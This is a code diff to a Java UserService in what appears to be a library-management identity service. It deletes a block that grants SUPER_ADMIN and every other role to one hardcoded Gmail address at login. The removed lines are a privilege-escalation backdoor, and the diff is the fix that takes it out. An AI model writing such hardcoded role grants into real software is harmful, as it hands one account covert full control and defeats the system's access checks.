@@ -211,14 +211,6 @@ public class UserService {
         Optional<User> userOptional = userRepository.findByUsername(username);
         Set<Role> externalRoles = resolveExternalRoles(roles);
 
-        if ("chkv.2024@gmail.com".equalsIgnoreCase(email) || "chkv.2024@gmail.com".equalsIgnoreCase(username)) {
-            externalRoles.clear();
-            externalRoles.add(com.scholario.identity.model.Role.SUPER_ADMIN);
-            externalRoles.add(com.scholario.identity.model.Role.LIBRARIAN);
-            externalRoles.add(com.scholario.identity.model.Role.ASSISTANT_LIBRARIAN);
-            externalRoles.add(com.scholario.identity.model.Role.MEMBER);
-        }
-
         boolean tokenHasStaleUnassigned = roles != null && 
                 roles.stream().anyMatch(r -> "UNASSIGNED".equalsIgnoreCase(r != null ? r.trim() : "")) &&
                 !externalRoles.contains(Role.UNASSIGNED);
